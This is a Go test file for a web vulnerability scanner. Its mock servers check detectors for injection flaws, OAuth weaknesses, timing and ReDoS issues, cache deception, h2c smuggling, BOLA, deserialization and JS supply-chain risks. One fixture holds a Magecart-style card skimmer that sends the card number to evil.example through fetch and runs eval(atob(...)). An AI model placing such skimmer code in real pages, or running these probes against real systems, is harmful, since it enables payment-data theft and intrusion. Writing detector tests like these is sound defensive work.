package vulnscan

// Coverage for the detector family added in the vulnscan expansion
// (API-deep/BOLA/Deser, mass assignment, NoSQL/LDAP/XPath, OAuth, timing/ReDoS,
// cache deception, h2c smuggling, JS supply chain) that previously had zero
// tests. One positive-detection case per check, matching how the rest of this
// package is tested.

import (
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"
)

// ─── TimingIsAnomalous ─────────────────────────────────────────────────────────

func TestTimingIsAnomalous(t *testing.T) {
	baseline := []int64{10, 12, 11, 9, 10, 11}
	if TimingIsAnomalous(baseline, 15, 4.0, 250) {
		t.Error("small delta below minDeltaMs must not be anomalous")
	}
	if !TimingIsAnomalous(baseline, 400, 4.0, 250) {
		t.Error("large, consistent delay over baseline must be anomalous")
	}
	if TimingIsAnomalous(nil, 400, 4.0, 250) {
		t.Error("empty baseline must never be anomalous")
	}
}

// ─── checkLDAPInjection / checkBlindXPath / checkNoSQLInjection ───────────────

func TestCheckLDAPInjection_ErrorSignature(t *testing.T) {
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.Contains(r.URL.RawQuery, "objectClass") {
			fmt.Fprint(w, "LDAP_SEARCH failed: invalid dn syntax")
			return
		}
		fmt.Fprint(w, "ok")
	}))
	defer ts.Close()

	s := newTestScanner(t, ts)
	s.BaseURL, _ = s.BaseURL.Parse(ts.URL + "/?q=1")
	s.Target = s.BaseURL.String()

	vulns := s.checkLDAPInjection()
	if len(vulns) == 0 {
		t.Fatal("expected WS-LDAP-001 when an LDAP error signature surfaces only under the payload")
	}
	if vulns[0].ID != "WS-LDAP-001" {
		t.Errorf("unexpected ID: %s", vulns[0].ID)
	}
}

func TestCheckBlindXPath_ErrorBased(t *testing.T) {
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.Contains(r.URL.RawQuery, "%27%22%5D%7C") || strings.Contains(r.URL.RawQuery, `'"]|`) {
			fmt.Fprint(w, "XPathException: unclosed token in expression")
			return
		}
		fmt.Fprint(w, "ok")
	}))
	defer ts.Close()

	s := newTestScanner(t, ts)
	s.BaseURL, _ = s.BaseURL.Parse(ts.URL + "/?q=1")
	s.Target = s.BaseURL.String()

	vulns := s.checkBlindXPath()
	if len(vulns) == 0 {
		t.Fatal("expected WS-XPATH-001 when an XPath error signature surfaces only under the broken-expression payload")
	}
}

func TestCheckNoSQLInjection_ErrorSignature(t *testing.T) {
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.Contains(r.URL.RawQuery, "gt") {
			fmt.Fprint(w, "MongoError: casterror on filter")
			return
		}
		fmt.Fprint(w, "ok")
	}))
	defer ts.Close()

	s := newTestScanner(t, ts)
	s.BaseURL, _ = s.BaseURL.Parse(ts.URL + "/?q=1")
	s.Target = s.BaseURL.String()

	vulns := s.checkNoSQLInjection()
	if len(vulns) == 0 {
		t.Fatal("expected WS-NOSQL-001 when a NoSQL error signature surfaces only under the operator payload")
	}
}

// ─── checkMassAssignment ───────────────────────────────────────────────────────

func TestCheckMassAssignment_AcceptsPrivilegedFields(t *testing.T) {
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		if r.Method == http.MethodGet {
			fmt.Fprint(w, `{"ok":true}`)
			return
		}
		body, _ := io.ReadAll(r.Body)
		w.WriteHeader(200)
		fmt.Fprintf(w, `{"echo":%s}`, string(body))
	}))
	defer ts.Close()

	s := newTestScanner(t, ts)
	s.Config.LabMode = true // checkMassAssignment performs real writes; requires explicit opt-in

	vulns := s.checkMassAssignment()
	if len(vulns) == 0 {
		t.Fatal("expected WS-MASSA-001 when the server echoes back injected privileged fields")
	}
}

func TestCheckMassAssignment_RequiresLabMode(t *testing.T) {
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"role":"maSSpwn_9137"}`)
	}))
	defer ts.Close()

	s := newTestScanner(t, ts) // LabMode left false

	if vulns := s.checkMassAssignment(); len(vulns) != 0 {
		t.Errorf("expected no probing without LabMode (real writes need explicit opt-in), got %d", len(vulns))
	}
}

// ─── checkOAuthPKCE / checkOAuthRedirectURI ────────────────────────────────────

func TestCheckOAuthPKCE_PlainChallengeAccepted(t *testing.T) {
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Query().Get("code_challenge_method") == "plain" {
			w.Header().Set("Location", "https://client.example/cb?code=abc123")
			w.WriteHeader(302)
			return
		}
		w.WriteHeader(200)
	}))
	defer ts.Close()

	s := newTestScanner(t, ts)
	s.BaseURL, _ = s.BaseURL.Parse(ts.URL + "/authorize?response_type=code&client_id=abc&redirect_uri=https://client.example/cb")
	s.Target = s.BaseURL.String()

	vulns := s.checkOAuthPKCE()
	if len(vulns) == 0 {
		t.Fatal("expected WS-OAUTH-001 when the server issues a code for code_challenge_method=plain")
	}
}

func TestCheckOAuthRedirectURI_Bypass(t *testing.T) {
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		redirect := r.URL.Query().Get("redirect_uri")
		w.Header().Set("Location", redirect) // vulnerable server: trusts redirect_uri blindly
		w.WriteHeader(302)
	}))
	defer ts.Close()

	s := newTestScanner(t, ts)
	s.BaseURL, _ = s.BaseURL.Parse(ts.URL + "/authorize?response_type=code&client_id=abc&redirect_uri=https://client.example/cb")
	s.Target = s.BaseURL.String()

	vulns := s.checkOAuthRedirectURI()
	if len(vulns) == 0 {
		t.Fatal("expected WS-OAUTH-002 when the server redirects to the attacker-controlled host")
	}
}

// ─── checkReDoS / checkTimingOracle ─────────────────────────────────────────────

func TestCheckReDoS_FlagsPathologicalLatency(t *testing.T) {
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if len(r.URL.Query().Get("q")) > 1000 {
			time.Sleep(300 * time.Millisecond)
		}
		w.WriteHeader(200)
	}))
	defer ts.Close()

	s := newTestScanner(t, ts)
	s.BaseURL, _ = s.BaseURL.Parse(ts.URL + "/?q=1")
	s.Target = s.BaseURL.String()

	vulns := s.checkReDoS()
	if len(vulns) == 0 {
		t.Fatal("expected WS-REDOS-001 when the pathological payload reproducibly delays the response")
	}
}

func TestCheckTimingOracle_FlagsCredentialLatencyDifference(t *testing.T) {
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.HasPrefix(r.URL.Query().Get("token"), "z") {
			time.Sleep(300 * time.Millisecond)
		}
		w.WriteHeader(200)
	}))
	defer ts.Close()

	s := newTestScanner(t, ts)
	s.BaseURL, _ = s.BaseURL.Parse(ts.URL + "/?token=x")
	s.Target = s.BaseURL.String()

	vulns := s.checkTimingOracle()
	if len(vulns) == 0 {
		t.Fatal("expected WS-TIMING-001 when a credential-like parameter shows a consistent latency split")
	}
}

// ─── checkCacheDeception ────────────────────────────────────────────────────────

func TestCheckCacheDeception_CacheHitOnStaticSuffix(t *testing.T) {
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-Cache", "HIT")
		w.WriteHeader(200)
		fmt.Fprint(w, strings.Repeat("dynamic-private-account-data ", 20))
	}))
	defer ts.Close()

	s := newTestScanner(t, ts)
	s.Config.AuthCookie = "session=abc123" // deception is only probed for authenticated content
	s.BaseURL, _ = s.BaseURL.Parse(ts.URL + "/dashboard")
	s.Target = s.BaseURL.String()

	vulns := s.checkCacheDeception()
	if len(vulns) == 0 {
		t.Fatal("expected WS-CACHE-002 when a static-suffixed authenticated URL comes back as a cache hit")
	}
}

// ─── checkH2CSmuggling ───────────────────────────────────────────────────────────

func TestCheckH2CSmuggling_UpgradeAccepted(t *testing.T) {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	defer ln.Close()

	go func() {
		conn, err := ln.Accept()
		if err != nil {
			return
		}
		defer conn.Close()
		conn.SetDeadline(time.Now().Add(3 * time.Second))
		buf := make([]byte, 4096)
		conn.Read(buf) // discard the request
		conn.Write([]byte("HTTP/1.1 101 Switching Protocols\r\nConnection: Upgrade\r\nUpgrade: h2c\r\n\r\n"))
	}()

	s, err := NewScanner("http://" + ln.Addr().String() + "/")
	if err != nil {
		t.Fatalf("NewScanner: %v", err)
	}

	vulns := s.checkH2CSmuggling()
	if len(vulns) == 0 {
		t.Fatal("expected WS-DESYNC-002 when the backend accepts an h2c upgrade")
	}
}

// ─── checkJSSupplyChain (passive, no network) ───────────────────────────────────

func TestCheckJSSupplyChain_CrossOriginScriptMissingSRI(t *testing.T) {
	s, _ := NewScanner("http://victim.example/page")
	body := `<html><script src="https://cdn.attacker-cdn.example/lib.js"></script></html>`

	vulns := s.checkJSSupplyChain(body, "http://victim.example/page")
	if len(vulns) == 0 {
		t.Fatal("expected WS-SUPPLY-001 for a cross-origin script with no integrity attribute")
	}
}

func TestCheckJSSupplyChain_MagecartPattern(t *testing.T) {
	s, _ := NewScanner("http://victim.example/checkout")
	body := `<html><script>
		var cardnumber = document.getElementById('cc').value;
		fetch('https://evil.example/collect?c=' + cardnumber);
		eval(atob('...'));
	</script></html>`

	vulns := s.checkJSSupplyChain(body, "http://victim.example/checkout")
	found := false
	for _, v := range vulns {
		if strings.Contains(v.Name, "Magecart") {
			found = true
		}
	}
	if !found {
		t.Fatal("expected a Magecart-style skimmer finding when card-field access, an exfil sink, and dynamic JS all correlate")
	}
}

// ─── checkAPIBOLA / checkAPIDeserialization ─────────────────────────────────────

func TestCheckAPIBOLA_CrossTenantObjectAccessible(t *testing.T) {
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		authed := r.Header.Get("Authorization") != ""
		id := r.URL.Query().Get("id")
		w.Header().Set("Content-Type", "application/json")
		switch {
		case id == "100" && authed:
			fmt.Fprint(w, `{"id":100,"email":"owner@example.com"}`)
		case id == "101" && authed:
			fmt.Fprint(w, `{"id":101,"email":"someone-else@example.com"}`)
		case id == "101" && !authed:
			w.WriteHeader(403)
			fmt.Fprint(w, "forbidden")
		default:
			w.WriteHeader(404)
		}
	}))
	defer ts.Close()

	s := newTestScanner(t, ts)
	s.Config.AuthBearer = "test-token"
	s.BaseURL, _ = s.BaseURL.Parse(ts.URL + "/api/objects?id=100")
	s.Target = s.BaseURL.String()

	vulns := s.checkAPIBOLA()
	if len(vulns) == 0 {
		t.Fatal("expected API-BOLA-001 when a neighbouring object is reachable but denied without credentials")
	}
}

func TestCheckAPIDeserialization_JavaStreamSignature(t *testing.T) {
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Content-Type") == "application/x-java-serialized-object" {
			w.WriteHeader(500)
			fmt.Fprint(w, "java.io.StreamCorruptedException: invalid stream header")
			return
		}
		w.WriteHeader(200)
		fmt.Fprint(w, "ok")
	}))
	defer ts.Close()

	s := newTestScanner(t, ts)

	vulns := s.checkAPIDeserialization()
	if len(vulns) == 0 {
		t.Fatal("expected API-DESER-001 when a native deserializer exception surfaces only under the probe content type")
	}
}
